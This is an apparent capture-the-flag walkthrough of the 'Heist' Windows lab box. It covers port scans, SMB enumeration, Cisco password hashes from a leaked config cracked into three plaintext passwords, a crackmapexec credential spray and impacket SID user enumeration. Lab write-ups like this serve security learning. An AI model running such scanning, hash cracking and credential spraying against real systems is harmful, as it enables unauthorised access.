# Heist

## NMAP

* Rustscan results

```console
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

```

* Nmap results

```console
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

## enum4linux-ng

```bash
enum4linux-ng -A $IP

NetBIOS computer name: SUPPORTDESK
DNS domain: SupportDesk      
FQDN: SupportDesk

After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                        
OS version: '10.0'
OS release: '1809'
OS build: '17763'

```

## web

* Logging as guest leads us to forum page where a user reports trouble accessing his cisco router with his config file
* Upon taking a look at the config file, few users and passwords will be disclosed
* The listed cisco type 5 and 7 password can be cracked via hashcat/john
* $uperP@ssword
* Q4)sJu\Y8qz*A3?d
* stealth1agent

## sid-enum

* once we have the usernames and passwords we can use cme to check if we can login

```bash
crackmapexec smb $IP -u users.txt -p pass.txt --shares
```

* After that we can enumerate the users via impacket script lookupsid

```bash
impacket-lookupsid hazard:stealth1agent@$
--------------------------------------------
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```